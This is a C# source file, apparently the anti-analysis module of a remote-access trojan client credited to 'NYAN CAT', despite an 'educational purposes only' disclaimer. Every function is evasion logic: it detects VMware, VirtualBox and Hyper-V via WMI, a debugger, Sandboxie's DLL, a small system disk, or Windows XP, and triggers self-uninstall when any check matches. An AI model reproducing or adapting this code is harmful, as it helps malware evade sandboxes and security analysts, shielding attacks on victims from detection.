using Client.Handle_Packet;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

//       │ Author     : NYAN CAT
//       │ Name       : Anti Analysis v0.2.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.




namespace Client.Helper
{

    class Anti_Analysis
    {
        public static void RunAntiAnalysis()
        {
            if (DetectManufacturer() || DetectDebugger() || DetectSandboxie() || IsSmallDisk() || IsXP())
                //Environment.FailFast(null);
                new HandleUninstall();
        }

        private static bool IsSmallDisk()
        {
            try
            {
                long GB_60 = 61000000000;
                if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= GB_60)
                    return true;
            }
            catch { }
            return false;
        }

        private static bool IsXP()
        {
            if (new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp"))
            {
                return true;
            }
            return false;
        }

        private static bool DetectManufacturer()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    using (var items = searcher.Get())
                    {
                        foreach (var item in items)
                        {
                            string manufacturer = item["Manufacturer"].ToString().ToLower();
                            if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                                || manufacturer.Contains("vmware")
                                || item["Model"].ToString() == "VirtualBox")
                            {
                                return true;
                            }
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            return isDebuggerPresent;
        }

        private static bool DetectSandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                return true;
            else
                return false;
        }


        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    }
}
